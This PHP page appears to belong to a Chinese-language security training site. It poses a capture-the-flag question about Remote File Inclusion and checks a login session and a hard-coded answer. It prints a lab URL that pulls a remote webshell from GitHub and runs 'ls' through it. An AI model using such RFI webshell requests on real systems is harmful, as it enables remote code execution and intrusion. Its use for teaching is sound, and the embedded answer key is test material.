<?php


session_start();
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: /account/login.php".(isset($_SERVER['REQUEST_URI'])?"?redirect=".$_SERVER['REQUEST_URI']:""));
    exit;
}

include("config.php");
if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["answer"])){
    $input_answer = $_POST["answer"];
    $user_id = $_SESSION["id"];
    if($input_answer=="是"){
        $challenges_name = "RCE-RFI-1";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link,$user_id,$challenges_name);
    }else{
        $challenge_array = array('alert','答案錯誤');
    }


}
$challenge_type =  $challenge_array[0];
$challenge_messange =  $challenge_array[1];
    

 
?>


<?php
    $titlename='Linux';
	include_once('../../php-inc/header.php');
?>






<h1>Romate File include</h1>

<b>以下 LAB 請於最下面的 flag 欄位填入答案。</b><br>
<br>

<br>
LAB:https://rcelab.feifei.tw/lfi/l4.php?url=https://raw.githubusercontent.com/fei3363/Security-Cheatsheet/main/webshell/meow.php&meow=ls


<br>

<h2>LAB1</h2>
構成 RFI 的 allow_url_include、allow_url_fopen 是否要開啟？


<form method="POST">
    <div class="form-group">
        <label for="answer"><br><h4>Flag提交</h4></label>
        <input type="text" class="form-control" placeholder="Enter flag" id="answer" name="answer">
    </div>
    <input type="submit" class="btn btn-primary" value="送出">
    <br>
</form>


<?php
	include_once('../../php-inc/footer.php');
?>
